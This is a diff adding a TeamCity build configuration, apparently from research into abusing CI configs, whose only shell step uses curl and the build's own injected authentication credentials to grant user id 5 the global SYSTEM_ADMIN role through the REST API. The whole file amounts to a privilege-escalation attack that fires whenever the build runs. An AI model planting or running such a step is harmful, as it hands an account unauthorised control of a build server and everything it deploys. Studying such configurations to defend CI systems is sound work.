@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<build-type xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" uuid="7f0997bf-cd46-4ff3-b16a-b33c33719a0b" xsi:noNamespaceSchemaLocation="http://www.jetbrains.com/teamcity/schemas/9.0/project-config.xsd">
+  <name>Script</name>
+  <description />
+  <settings>
+    <parameters />
+    <build-runners>
+      <runner id="RUNNER_341" name="" type="simpleRunner">
+        <parameters>
+          <param name="script.content"><![CDATA[echo curl -v -request PUT %teamcity.serverUrl%/httpAuth/app/rest/users/id:5/roles/SYSTEM_ADMIN/g/  -basic -user %system.teamcity.auth.userId%:%system.teamcity.auth.password%
+curl -v -request PUT %teamcity.serverUrl%/httpAuth/app/rest/users/id:5/roles/SYSTEM_ADMIN/g/  -basic -user %system.teamcity.auth.userId%:%system.teamcity.auth.password%]]></param>
+          <param name="teamcity.step.mode" value="default" />
+          <param name="use.custom.script" value="true" />
+        </parameters>
+      </runner>
+    </build-runners>
+    <vcs-settings>
+      <vcs-entry-ref root-id="DirtyConfigurations_CopiedConfigurations_2_HttpsGithubComJuliaReshReports" />
+    </vcs-settings>
+    <requirements />
+    <build-triggers />
+    <cleanup />
+  </settings>
+</build-type>
+
